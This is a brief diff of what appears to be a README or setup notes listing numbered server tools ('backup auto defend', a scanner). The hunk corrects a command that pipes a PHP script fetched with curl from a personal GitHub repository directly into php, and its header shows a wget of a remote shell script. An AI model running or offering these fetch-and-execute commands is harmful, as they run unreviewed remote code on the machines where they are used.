@@ -6,7 +6,7 @@ wget https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/sca.sh 
 
 2, backup auto defend
 
-curl -s githubusercontent.com/heck221/fungsiini/refs/heads/main/cod.php | php - backup y
+curl -s https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/cod.php | php - backup y
 
 3, scanner powerfull 
 
